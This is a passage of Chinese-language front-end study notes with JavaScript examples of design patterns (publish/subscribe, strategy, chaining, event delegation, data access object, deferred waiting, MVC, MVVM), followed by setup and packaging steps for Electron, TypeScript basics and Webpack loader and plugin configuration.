      console.log('person1得到了关于' + e.type + '的消息，消息内容是：' + e.args.info);
    })
    person1.subscribe('newsInfo', function (e) {
      console.log('person1得到了关于' + e.type + '的消息，消息内容是：' + e.args.info);
    })
    person2.subscribe('carInfo', function (e) {
      console.log('person2得到了关于' + e.type + '的消息，消息内容是：' + e.args.info);
    })
    person3.subscribe('newsInfo', function (e) {
      console.log('person3得到了关于' + e.type + '的消息，消息内容是：' + e.args.info);
    })
    person3.subscribe('carInfo', function (e) {
      console.log('person3得到了关于' + e.type + '的消息，消息内容是：' + e.args.info);
    })
    //发布消息
    msgCenter.release('carInfo', { info: '新款汽车上市！' })
    msgCenter.release('newsInfo', { info: '某国家领导人访华' })
    //测试检测重复订阅功能
    person3.subscribe('carInfo', function (e) {
      console.log('person3得到了关于' + e.type + '的消息，消息内容是：' + e.args.info);
    })
    //测试取消订阅功能
    person3.cancel('carInfo')
    msgCenter.release('carInfo',{info:'再发一条消息'})
```

上面代码实现的核心是把每个实例的函数传递给msgCenter函数中的_msg数组保存好，并且通过type属性来进行区分，如果有消息发布，就全部执行一遍该数组的所有方法

### 策略模式

> strategy，
>
> 在现实生活中常常遇到实现某种目标存在多种策略可供选择的情况，例如，出行旅游可以乘坐飞机、乘坐火车、骑自行车或自己开私家车等，超市促销可以釆用打折、送商品、送积分等方法。
>
> 在软件开发中也常常遇到类似的情况，当实现某一个功能存在多种算法或者策略，我们可以根据环境或者条件的不同选择不同的算法或者策略来完成该功能，如数据排序策略有冒泡排序、选择排序、插入排序、二叉树排序等。
>
> 如果使用多重条件转移语句实现（即硬编码），不但使条件语句变得很复杂，而且增加、删除或更换算法要修改原代码，不易维护，违背开闭原则。如果采用策略模式就能很好解决该问题。

通俗解析:

> 假设一段文字需要进行检测是否为数字，是否为空，是否是邮箱等等，一般来说我们会使用if_else来进行判断，如果既要检测是否为数字又是否为电话号码，那么就需要两个if_else，且灵活性和复用性并不强，而策略模式是把一大堆需要用到的检测方法或者算法或者功能封装到一个对象中，并且为对象配置validate方法，用以调用对象中的方法，随便用，一个或者多个，复用，都没问题

例子：

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <input type="text">
  <script>
    //策略模式
    var formStrategy = (function () {
      var strategy = {
        notEmpty: function (value) {
          return value.length ? '' : '请填写内容'
        },
        isNumber: function (value) {
          var reg = /^[0-9]+(\.[0-9])?$/;
          return reg.test(value) ? '' : '请填写一个数字'
        },
        isPhone: function (value) {
          //010-12345678 0022-1234567
          var reg = /^\d{3}-\d{8}$|^\d{4}-\d{7}$/
          return reg.test(value) ? '' : '请输入一个正确的电话好吗'
        }
      }
      return {
        // 检测方法，type是输入要检测的类型，value是值
        validate: function (type, value) {
          //去除输入文字两边的空白符
          value = value.replace(/^\s*|\s*$/g, "")
          return strategy[type] ? strategy[type](value) : '没有这个检测方法，请手动添加'
        },
        //临时添加自定义检测算法
        addStrategy: function (type, fn) {
          if (strategy[type]) {
            return '这个方法已经存在'
          } else {
            strategy[type] = fn
          }
        }
      }
    })()
    //测试
    var oInput = document.querySelector('input')
    oInput.onchange = function () {
      var result;
      result = formStrategy.validate('notEmpty', this.value) || formStrategy.validate('isNumber', this.value) || '通过检测'
      console.log(result);
    }
  </script>
</body>

</html>
```

### 链模式

> 链模式是实现链式调用的主要方法，通过在自身方法中返回自身的方式，在一个对象连续多次调用自身方法可以简化写法
>
> 这种链式调用在开很多库和框架如jquery/zepto中频繁的被使用。

简单的链模式

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <script>
    var obj = {
      a: function () {
        console.log('aaa');
        return this
      },
      b: function () {
        console.log('bbb');
        return this
      }
    }

    obj.a().b().a().a()    ///aaa bbb aaa aaa
  </script>
</body>
</html>
```

### 委托模式

> 当多个对象需要处理同一请求时，可以将这些请求交由另一个对象统一处理

普通模式

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <ul class="ul1">
    <li>aaaa</li>
    <li>bbbb</li>
    <li>cccc</li>
    <li>dddd</li>
  </ul>
  <script>
     var aLis = document.getElementsByTagName('li')
     for (let index = 0; index < aLis.length; index++) {
       (function (i) {
        aLis[index].onclick = function () {
           console.log(index);
         }
       })(index)
     }
  </script>
</body>
</html>
```

这样会绑定多个事件，会影响性能

使用委托模式进行改进：

```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <ul class="ul1">
    <li>aaaa</li>
    <li>bbbb</li>
    <li>cccc</li>
    <li>dddd</li>
  </ul>
  <script>
    var oUl = document.querySelector('ul')
    oUl.onclick = function (e) {
      console.log(e);
      var e = e || window.event
      target = e.target || e.srcElement
      if(target.nodeName.toLowerCase() === 'li'){
        console.log(target.innerHTML);
      }
    }
    var oLi = document.createElement('li')
    oLi.innerHTMl = 'eeee'
    oUl.appendChild(oLi)
  </script>
</body>
</html>
```

### 数据访问对象模式

> 数据访问对象模式主要是用来抽象和封装一个对象来对数据源进行访问和存储，这样可以方便对数据的管理，以及避免数据间的重复，覆盖等问题

实例：

```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>

<body>
  <script>
    // {
    //   key: expire|value
    // }
    function DataVisitor(splitSign) {
      this.splitSign = splitSign || '|'
    }
    DataVisitor.prototype = {
      status: {
        SUCCESS: 1,
        FAILURE: 0,
        OVERFLOWER: 2,
        TIMEOUT: 3
      },
      set: function (key, value, cbFn, expireTime) {
        var status = this.status.SUCCESS;
        expireTime = typeof expireTime === 'number' ? expireTime + new Date().getTime() : -1
        try {
          window.localStorage.setItem(key, expireTime + this.splitSign + value)
        } catch (e) {
          status = this.status.OVERFLOWER
        }
        cbFn && cbFn.call(this, status, key, value);
        return value
      },
      get: function (key, cbFn) {
        var status = this.status.SUCCESS
        var value = window.localStorage.getItem(key)
        if (value) {
          var index = value.indexOf(this.splitSign),
            time = value.slice(0, index)
          if (time > new Date().getTime() || time == -1) {
            value = value.slice(index + this.splitSign.length)
          } else {
            value = null;
            status = this.status.TIMEOUT;
            window.localStorage.removeItem(key)
          }
        } else {
          status = this.status.FAILURE
        }
        cbFn && cbFn.call(this, status, key, value)
      },
      remove: function (key, cbFn) {
        var status = this.status.FAILURE;
        value = window.localStorage.getItem(key);
        if (value) {
          value.slice(value.indexOf(this.splitSign) + this.splitSign.length)
          window.localStorage.removeItem(key);
          status = this.status.SUCCESS;
        }
        cbFn && cbFn.call(this, status)
      }
    }
    
    var test = new DataVisitor();
    test.set('aaa', '1273', function (status) {
      console.log(Boolean(status));
    }, 2000)
    test.get('aaa', function (status, key, value) {
      console.log(status, key, value);
    })
    setTimeout(() => {
      test.get('aaa', function (status, key, value) {
        console.log(status, key, value);
      }, 2000)
    }, 1000);
    setTimeout(() => {
      test.get('aaa', function (status, key, value) {
        console.log(status, key, value);
      }, 2000)
    }, 3000);
    // test.remove('aaa',function (status) {
    //    console.log(Boolean(status));
    // })
    // test.remove('aaab', function (status) {
    //     console.log(Boolean(status));
    //   })
  </script>
</body>

</html>
```

### 等待者模式

> 通过对多个异步进程的监听，对未来事件进行统一管理。

```
 //等待对象
    var Writer = function () {
      var dfd = [],//等待对象容器,When中传入的异步执行方法，实为事件对象数组
        doneArr = [],//成功回调方法容器，用于存放done中传入的成功回调方法
        failArr = [],//失败回调方法容器，用于存放fail中传入的失败回调方法
        slice = Array.prototype.slice,
        that = this;

      //监控对象类
      var Primise = function () {
        //监控成功状态
        this.resolved = false;
        //监控失败状态
        this.rejected = false;
      }

      //扩展对异步逻辑的监控方法，这两个方法都是因异步逻辑状态的改变而执行相应操作的
      Primise.prototype = {
        //解决成功
        resolve: function () {
          //设置当前监控对象解决成功，每一个事件都有自己独立的监控对象，
          //都有自己的独立成功状态与失败状态
          this.resolved = true;
          //如果没有监控对象则取消执行
          if (!dfd.length) return;
          //遍历所有注册了的监控对象
          for (var i = dfd.length - 1; i >= 0; i--) {
            //如果有任意一个监控对象没有被解决或者解决失败则返回
            if (dfd[i] && !dfd[i].resolved || dfd[i].rejected) {
              return;
            }
            //如果已经解决则清除已解决监控对象
            dfd.splice(i, 1);
          }
          //执行解决成功回调方法
          _exec(doneArr);
        },
        //解决失败
        reject: function () {
          //设置当前监控对象解决失败
          this.rejected = true;
          //如果没有监控对象则取消执行
          if (!dfd.length) return;
          //清除所有监控对象
          dfd.splice(0);
          //执行解决失败回调方法
          _exec(failArr);
        }
      }
      //创建监控对象
      that.Deferred = function () {
        return new Primise();
      }
      //监控异步方法 参数：监控对象，用于监测已经注册过的监控对象的异步逻辑
      that.When = function () {
        //设置监控对象
        dfd = slice.call(arguments);
        var i = dfd.length;
        for (--i; i >= 0; i--) {
          //如果不存在监控对象，或者监控对象已经解决，或者不是监控对象
          if (!dfd[i] || dfd[i].resolved || dfd[i].rejected || !dfd[i] instanceof Primise) {
            //清除当前监控对象
            dfd.splice(i, 1);
          }
        }
        return that;
      }
      //解决成功回调函数添加方法，用于向对应的回调容器中添加相应回调
      that.done = function () {
        doneArr = doneArr.concat(slice.call(arguments));
        return that;
      }
      //解决失败回调函数添加方法，用于向对应的回调容器中添加相应回调
      that.fail = function () {
        failArr = failArr.concat(slice.call(arguments));
        return that;
      }
      //回调执行方法
      function _exec(arr) {
        //遍历回调数组执行回调,注意，此处为了按先后顺序执行，不能用逆向循环
        for (var i = 0, len = arr.length; i < len; i++) {
          try {
            arr[i] && arr[i]();
          } catch (e) { }
        }
      }
    }
    //运用场景模拟：假设页面中有多个随机运动的彩蛋，每个彩蛋结束后都要展示一个欢迎页面
    var waiter = new Writer();

    //第1个彩蛋，5秒后停止
    var first = function () {
      //创建监听对象
      var dtd = waiter.Deferred();
      setTimeout(function () {
        console.log('first');
        //发布解决成功消息，执行解决成功回调，
        //当在执行成功回调时，同时会检查其他事件的最后状态，
        //如果其他事件都已经成功执行，则执行成功回调
        //如果有其他事件还未执行完毕，则只负责把自己的状态设置为成功，
        dtd.resolve();
      }, 500);
      //返回监听对象
      return dtd;
    }();

    //第2个彩蛋，10秒后停止
    var second = function () {
      //创建监听对象
      var dtd = waiter.Deferred();
      setTimeout(function () {
        console.log('second');
        //发布解决成功消息
        dtd.resolve();//
      }, 1000);
      //返回监听对象
      return dtd;
    }();

    //最后，我们用等待者对象监听两个彩蛋的工作状态，并执行相应的成功回调与失败回调
    waiter
      .When(first, second)//把异步方法加入when当中监听
      .done(function () {
        //把成功回调方法加入donearr中保存，在监听的事件中，
        //只要有一个事件的最终状态为失败，则整个结果为失败，成功队列中的方法不再执行
        //当且仅当所有的最终结果为成功，才算成功，才会执行done中方法
        console.log('success');
      }, function () {
        console.log('success again');
      })
      .fail(function () {
        //把失败回调方法加入failarr中保存，只要有一个事件的最终结果为失败，则执行失败回调方法
        console.log('fail');
      }, function () {//把失败回调方法加入failarr中保存
        console.log('fail again');
      })

     //first
     //second
     //success
     //success again
```

### MVC模式

> MVC即Model-View-Controller（模型-视图-控制器）是一种软件设计模式，最早出现在Smalltalk语言中，后被Sun公司推荐为Java EE平台的设计模式。

　MVC把应用程序分成了上面3个核心模块，这3个模块又可被称为业务层-视图层-控制层。顾名思义，它们三者在应用程序中的主要作用如下：

**业务层**：负责实现应用程序的业务逻辑，封装有各种对数据的处理方法。它不关心它会如何被视图层显示或被控制器调用，它只接受数据并处理，然后返回一个结果。

**视图层**：负责应用程序对用户的显示，它从用户那里获取输入数据并通过控制层传给业务层处理，然后再通过控制层获取业务层返回的结果并显示给用户。

**控制层**：负责控制应用程序的流程，它接收从视图层传过来的数据，然后选择业务层中的某个业务来处理，接收业务层返回的结果并选择视图层中的某个视图来显示结果。

![img](https://t11.baidu.com/it/u=3066061642,1532806395&fm=173&app=25&f=JPEG?w=504&h=300&s=A983CC1223DA6DC80A761159020050FA)

在MVC里，View是可以直接访问Model的，所以View里会包含Model信息以及一些业务逻辑。 MVC模型关注的是Model的不变，所以在MVC模型里，Model不依赖于View，但是 View是依赖于Model的。不仅如此，因为有一些业务逻辑在View里实现了，导致要更改View也是比较困难的，至少那些业务逻辑是无法重用的。

代码：

```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>

<body>
  <script>
    //一个简单的mvc实例
    var MVC = {}

    MVC.model = (function () {
      var data = {
        sidebar: [{
          title: 'sidebar1',
          href: './a.html'
        }, {
          title: 'sidebar2',
          href: './b.html'
        }, {
          title: 'sidebar3',
          href: 'http://www.baidu.com'
        }]
      }

      return {
        getData: function (key) {
          return data[key]
        },
        setData: function (key, value) {
          data[key] = value
          MVC.view('createSidebar')
        }
      }
    })()

    MVC.view = (function () {
      var m = MVC.model
      var view = {
        createSidebar: function () {
          var data = m.getData('sidebar')
          var html = ''
          html += '<div id ="#sidebar">'
          for (let i = 0; i < data.length; i++) {
            html += '<div class="sidebar-item"><a href="' + data[i].href + '">' + data[i].title + '</a></div>'
          }
          html += '</div>'

          document.body.innerHTML += html
        }
      }
      return function (v) {
        view[v]()
      }
    })()

    MVC.ctrl = (function () {
      var m = MVC.model
      var v = MVC.view
      var c = {
        initSideBar: function () {
          v('createSidebar')
        },
        updateSiderBar: function () {
          m.setData('sidebar', [{ title: 'new sidebar', href: 'http://www.baidu.com' }])
        }
      }
      return c
    })()

    window.onload = function () {
      //从control修改model
      MVC.ctrl.initSideBar()
      setTimeout(() => {
        MVC.ctrl.updateSiderBar()
      }, 3000);
      setTimeout(() => {
        MVC.view('createSidebar')
      }, 6000);
      setTimeout(() => {
        MVC.view('createSidebar')
      }, 9000);
    }
  </script>
</body>

</html>
```

### MVVM模式

> MVVM模式在传统MVC模式下进行改造，实现其重在数据驱动视图的一种设计模式。

<img src="https://i.loli.net/2021/02/27/WZCXuRrNTIUvdHf.png" alt="image-20210219030956917" style="zoom:67%;" />

```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>

<body>
  <script>
    //如何实现数据与视图绑定
    // 1、需要知道哪个数据改变了。一般我们可以使用数据访问对象的方法。在vue中我们使用的是es5的对象访问属性get/set
    // 2、修改视图
    var model = {
      a: 1,
      b: 2
    }
    // vm
    for (var key in model) {
      ; (function (key) {
        var value = model[key]
        Object.defineProperty(model, key, {
          get: function () {
            return value
          },
          set: function (newVal) {
            value = newVal
            render()
          }
        })
      })(key)
    }
    //view
    let render = (function render() {
      console.log('render执行了');
      document.body.innerHTML = '<div><h3>想显示一些文案</h3><p>a的值: ' + model.a + ',b的值：' + model.b + '</p></div>'
      return render
    })()

    setTimeout(() => {
      model.b = 3
    }, 2000);
    setTimeout(() => {
      model.b = 11111
    }, 3000);

  </script>
</body>

</html>
```



## 	布局

### 		Flex布局

### 		Rem布局

### 		响应式布局

# 手机端

## 	构建工具（Hbuilder)

# 小程序

## 	原生小程序

# PC端

## Electron

### Electron简介

### Electron开发环境搭建

1. 安装nodejs

2. 安装electron

   npm i electron -g 

   <img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220224.png" alt="image-20201016095134633" style="zoom: 80%;" />

   输入npx electron -v检查是否安装成功

   ![image-20201016095215619](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220216.png)

3. 创建Helloworld

   创建三个必备文件夹，第一文件夹是窗口要渲染的页面，第二个文件是主进程，第三个文件是配置文件

   ![image-20201016095940167](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220220.png)

   具体内容：

   main.js:

   ```
   var electron = require('electron')
   //引用app
   var app = electron.app
   // 窗口引用
   var BrowserWindow = electron.BrowserWindow
   //声明要打开的主窗口
   var mainWindow = null
   app.on('ready', () => {
     mainWindow = new BrowserWindow({
       width: 800,
       height: 600,
     })
     mainWindow.loadFile('index.html')
     mainWindow.on('closed', () => {
       mainWindow = null
     })
   })
   ```

   package.json:

   简洁命令：npm init --y

```
     {
       "name": "helloworld",
       "version": "1.0.0",
       "description": "",
       "main": "main.js",
       "scripts": {
         "test": "echo \"Error: no test specified\" && exit 1"
       },
       "keywords": [],
       "author": "",
       "license": "ISC"
     }

```

index.html就不展示了，和普通的一样

进入到项目目录，输入electron . 执行

![image-20201016100305750](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220259.png)

![image-20201016100315096](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220304.png)

#### 打包文件

**方案一：（不推荐）**

1. 输入 npm install electron-packager -g**全局安装**我们的打包神器：

```
		npm i electron --save-dev
		npm install electron-packager -g
```

  2、在项目文件夹下面，也就是根目录下面打开DOS执行打包命令：	

```
	electron-packager . HelloWorld --platform=win32 --arch=x64 --icon=computer.ico --out=./out --asar --app-version=0.0.1 --overwrite --			ignore=node_modules --electron-version 5.0.0
```

**各个参数介绍：**

```
HelloWorld ：你将要生成的exe文件的名称
```

![img](https://img2018.cnblogs.com/blog/1242944/201906/1242944-20190618135520631-1919275615.png)

```
--platform=win32：确定了你要构建哪个平台的应用,可取的值有 darwin, linux, mas, win32
--arch=x64：决定了使用 x86 还是 x64 还是两个架构都用
--icon=computer.ico：自定义设置应用图标
--out=./out：指定打包文件输出的文件夹位置,当前指定的为项目目录下的out文件夹
--asar：该参数可以不加，如果加上，打包之后应用的源码会以.asar格式存在
```

![img](https://img2018.cnblogs.com/blog/1242944/201906/1242944-20190618141037414-1277263689.png)

```
，否则会以文件夹形式存在
```

![img](https://img2018.cnblogs.com/blog/1242944/201906/1242944-20190618141130331-2106206669.png)

```
--app-version=0.0.1：生成应用的版本号
--overwrite：覆盖原有的build,让新生成的包覆盖原来的包
--ignore=node_modules：如果加上该参数，项目里node_modules模块不会被打包进去
--electron-version 5.0.0：指定当前要构建的electron的版本,需要和当前的版本一致,具体可以在package.json文件中查看,可以不加该
```

**方案二：（推荐）**

建议将打包的命令设置在`package.json`的`script`中

设置如下:

```
  "scripts": {"package":"electron-packager . HelloWorld --platform=win32 --arch=x64 --icon=computer.ico --out=./out --asar --app-version=0.0.1 --overwrite --ignore=node_modules"
  }
```

然后在项目文件夹DOS窗口下执行命令：

```
npm run package
```

即可打包成功

# 微前端

## WebComponents

# TypeScript

## 简介

> TypeScript 是 JavaScript 的超集，扩展了 JavaScript 的语法，因此现有的 JavaScript 代码可与 TypeScript 一起工作无需任何修改，TypeScript 通过类型注解提供编译时的静态类型检查。
>
> TypeScript = Type + JavaScript (为JS添加了类型系统)
>
> TypeScript 可处理已有的 JavaScript 代码，并只对其中的 TypeScript 代码进行编译。
>
> TypeScript是微软开发的开源编程语言，设计目标是开发大型应用。
>
> 可以在任何浏览器、任何计算机、任何操作系统上运行。

**TypeScript 代码：有明确的类型，即 ：number (数值类型)**

```
	let age: number = 18
```

JavaScript 代码：无明确的类型

```
	let age = 18
```

## 环境配置

nodejs

```
	npm i -g typescript
```

typescript：就是用来解析TS的工具包。提供了TS命令，是实现了TS->JS的转化。

```
	tsc -v  //查看typescript版本，可以检查是否安装成功
```

![image-20201121131021457](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220309.png)

## 基本使用

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220313.png" alt="image-20201121131601229" style="zoom:67%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220318.png" alt="image-20201121132208220" style="zoom:67%;" />

## 变量

> **基本使用**

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220324.png" alt="image-20201121133100575" style="zoom:67%;" />

```
	//第一步：声明变量并指定类型
	let age: number
	//第二步: 给变量赋值
	age = 18
	console.log(age)   //18
	//变量是可以变化的
	age = 19
	console.log(age)   //19
```

> **简化形式**

```
	//简化方式： 声明变量的同时就赋值
	let age: number = 18
	console.log(age)  //18
```

> 变量的命名规则

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220327.png" alt="image-20201121134601478" style="zoom:67%;" />

## 运算符

加号的其他作用：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220331.png" alt="image-20201121155956941" style="zoom:67%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220334.png" alt="image-20201121160041060" style="zoom:67%;" />

`注意：以上的只是针对TS语法，JS并不完全一样，JS中减法可以有除number类型的其他数据，并且都会转化成number类型`

## 数组

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220338.png" alt="image-20201121221043029" style="zoom: 67%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220342.png" alt="image-20201121222351980" style="zoom:67%;" />

## 函数

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220346.png" alt="image-20201121223309539" style="zoom: 67%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220350.png" alt="image-20201121223532245" style="zoom:67%;" />

## 对象

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220354.png" alt="image-20201122124356699" style="zoom:67%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220359.png" alt="image-20201122124415777" style="zoom:67%;" />

### 接口

> 为对象的类型注解命名，并为你的代码建立契约来约束对象的结构

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220403.png" alt="image-20201122124305185" style="zoom:67%;" />

## 在浏览器中运行TS

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220406.png" alt="image-20201122140542944" style="zoom:67%;" />

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220411.png" alt="image-20201122141620490" style="zoom:67%;" />

# Webpack

## 简介

> webpack 是一种前端资源构建工具，一个静态模块打包器(module bundler)。 
>
> 在 webpack 看来, 前端的所有资源文件(js/json/css/img/less/...)都会作为模块处理。 
>
> 它将根据模块的依赖关系进行静态分析，打包生成对应的静态资源(bundle)

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220415.png" alt="image-20210226081417871" style="zoom:80%;" />

 **webpack五个核心概念**

***1 Entry*** 

入口(Entry)指示 webpack 以哪个文件为入口起点开始打包，分析构建内部依赖图。 

***2 Output*** 

输出(Output)指示 webpack 打包后的资源 bundles 输出到哪里去，以及如何命名。 

***3 Loader*** 

Loader 让 webpack 能 够 去 处 理 那 些 非 JavaScript 文 件 (webpack 自 身 只 理 解 

JavaScript) 

***4 Plugins*** 

插件(Plugins)可以用于执行范围更广的任务。插件的范围包括，从打包优化和压缩， 

一直到重新定义环境中的变量等。 

***5 Mode*** 

模式(Mode)指示 webpack 使用相应模式的配置。 

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210505220419.png" alt="image-20210226081706154" style="zoom:80%;" />

## 基本使用

### 初始化

1、初始化 package.json 

​	    输入指令: 

​	    npm init

2、下载并安装 webpack 

​		输入指令: 

​		npm install webpack@4.41.6 webpack-cli@3.3.11 -g （这是为了执行包的终端命令,webpack-cli的作用应该是处理打包的文件）

​		npm install webpack@4.41.6 webpack-cli@3.3.11 -D (这不是必须的，但是如果没有，那么项目就会去全局寻找，如果项目发给别人运行，就无法保证			  webpack版本一致)

​		`建议以这种方式安装（推荐）：`

​		npm install webpack@4.41.6 webpack-cli@3.3.11 -D 

​		然后使用npx webpack运行

​		为什么要局部和全局两次安装呢？

​		答：

​			全局安装的目的是为了可以使用webpack命令，这个命令它会去全局去找，不会在局部中的.bin找，我们也可以不全局安装，使用npx webpack也行，

​			局部安装：局部安装是为了保存到package.json中，所以没有什么用，而全局安装是不会记录在项目package.json中的，

验证：当我局部和全局都安装webpack了,我在局部安装的webpack脚本加上一句

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210301041437.png" alt="image-20210301041436910" style="zoom:67%;" />

全局安装的webpack脚本也加上一句

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210301041603.png" alt="image-20210301041602966" style="zoom:67%;" />

执行命令webpack

![image-20210301041758167](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210301041758.png)

### 简单使用

1. 创建文件 

   ![image-20210226133412510](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210312180403.png)

2. 运行指令 

   开发环境指令：webpack ./src/index.js -o ./build/built.js --mode=development 

   ​	`功能：webpack 能够编译打包 js 和 json 文件，并且能将 es6 的模块化语法转换成` 

   ​	`浏览器能识别的语法。` 

   生产环境指令：webpack ./src/index.js -o ./build/built.js --mode=production 

   功能：在开发配置功能上多一个功能，压缩代码。 

   index.js代码：

   ```
   import data from './data.json';
   console.log(data);
   function add(x, y) {
     return x + y;
   }
   console.log(add(1, 2));
   ```

   ![image-20210226133313700](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210312180357.png)

3. 结论

   webpack 能够编译打包 js 和 json 文件。 

   能将 es6 的模块化语法转换成浏览器能识别的语法。 

   ![image-20210226133751605](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210312180411.png)

   能压缩代码。 

4. 问题

   不能编译打包 css、img 等文件。 

   不能将 js 的 es6 基本语法转化为 es5 以下语法。

   注：这时候webpack只能打包js/json，还不需要配置webpack配置，我们可以通过命令行配置出入口

## 开发环境

### 基础配置

** **创建基础配置文件** 

1. 创建文件 webpack.config.js 
2. 配置内容如下 

```
     const { resolve } = require('path');
     // node 内置核心模块，用来处理路径问题
     module.exports = {
        // 入口文件 
       entry: './src/js/index.js',
        // 输出配置 
       output: {
     	// 输出文件名
         filename: './built.js',
          // 输出文件路径配置 
         path: resolve(__dirname, 'build/js'),
         //静态文件打包存放的目录。静态文件是指 img 的src ,link ，script 标签等所指向的文件。publicPath 是相对于path 所在的路径。是一个相对路径。
         publicPath: './'
       }, mode: 'development'
       //开发环境 
     };
```

​	    3. 运行指令: webpack 

 	   4. 结论: 此时功能与上节一致 

### 打包css/less资源

1. 创建文件 

2. 下载安装 loader 包 

   npm i css-loader style-loader less-loader@5.0.0 less -D 

3. 修改配置文件 

```
     /*
       webpack.config.js  webpack的配置文件
         作用: 指示 webpack 干哪些活（当你运行 webpack 指令时，会加载里面的配置）

         所有构建工具都是基于nodejs平台运行的~模块化默认采用commonjs。
     */

     // resolve用来拼接绝对路径的方法
     const { resolve } = require('path');
     module.exports = {
       // webpack配置
       // 入口起点
       entry: './src/index.js',
       // 输出
       output: {
         // 输出文件名
         filename: 'built.js',
         // 输出路径
         // __dirname nodejs的变量，代表当前文件的目录绝对路径
         path: resolve(__dirname, 'build')
       },
       // loader的配置
       module: {
         rules: [
           // 详细loader配置
           // 不同文件必须配置不同loader处理
           {
             // 匹配哪些文件
             test: /\.css$/,
             // 使用哪些loader进行处理
             use: [
               // use数组中loader执行顺序：从右到左，从下到上 依次执行
               // 创建style标签，将js中的样式资源插入进行，添加到head中生效
               'style-loader',
               // 将css文件变成commonjs模块加载js中，里面内容是样式字符串
               'css-loader'
             ]
           },
           {
             test: /\.less$/,
             use: [
               'style-loader',
               'css-loader',
               // 将less文件编译成css文件
               // 需要下载 less-loader和less
               'less-loader'
             ]
           }
         ]
       },
       // plugins的配置
       plugins: [
         // 详细plugins的配置
       ],
       // 模式
       mode: 'development', // 开发模式
       // mode: 'production'
     }
```

4. 运行指令: webpack 

### 打包 HTML 资源 

1. 创建文件 

2. 下载安装 plugin 包 

   npm install --save-dev html-webpack-plugin@3.2.0

3. 修改配置文件 

```
     /*
       loader: 1. 下载   2. 使用（配置loader）
       plugins: 1. 下载  2. 引入  3. 使用
     */
     const { resolve } = require('path');
     //打包html文件
     const HtmlWebpackPlugin = require('html-webpack-plugin');
     module.exports = {
       entry: './src/index.js',
       output: {
         filename: 'built.js',
         path: resolve(__dirname, 'build2')
       },
       module: {
         rules: [
           // loader的配置
         ]
       },
       plugins: [
         // plugins的配置
         // html-webpack-plugin
         // 功能：默认会创建一个空的HTML，自动引入打包输出的所有资源（JS/CSS）
         // 需求：需要有结构的HTML文件
         new HtmlWebpackPlugin({
           // 复制 './src/index.html' 文件，并自动引入打包输出的所有资源（JS/CSS）,默认复制到output目录
           template: './src/index.html'
         })
       ],
       mode: 'development'
     };
```

4.运行指令: webpack 

###  打包图片资源 

1. 创建文件 

2. 下载安装 loader 包 

   npm install --save-dev html-loader@0.5.5 url-loader file-loader 

3. 修改配置文件 

```
     const { resolve } = require('path');
     const HtmlWebpackPlugin = require('html-webpack-plugin');

     module.exports = {
       entry: './src/index.js',
       output: {
         filename: 'built.js',
         path: resolve(__dirname, 'build')
       },
       module: {
         rules: [
         	//将HTML导出为字符串。当编译器需要时，HTML被最小化。
           {
             test: /\.html$/,
             // 处理html文件的img图片（负责引入img，从而能被url-loader进行处理）
             loader: 'html-loader'
           },
           {
             // 问题：默认处理不了html中img图片
             // 处理图片资源
             test: /\.(jpg|png|gif)$/,
             // 使用一个loader
             // 下载 url-loader file-loader
             // 当图片体积大于 8192 字节时，默认会使用 file- loader
             // （虽然代码没有配置 file - loader，但还是需要使用 npm i file - loader - D 安装），
             // 并且会将配置的选项传递给 file - loader（也就是说上面可以配置 name、outputPath 等选项）
             loader: 'url-loader',
             options: {
               // 图片大小小于8kb，就会被base64处理
               // 优点: 减少请求数量（减轻服务器压力）
               // 缺点：图片体积会更大（文件请求速度更慢）
               limit: 8 * 1024,
               // 问题：因为url-loader默认使用es6模块化解析，而html-loader引入图片是commonjs
               // 解析时会出问题：[object Module]
               // 解决：关闭url-loader的es6模块化，使用commonjs解析
               esModule: false,
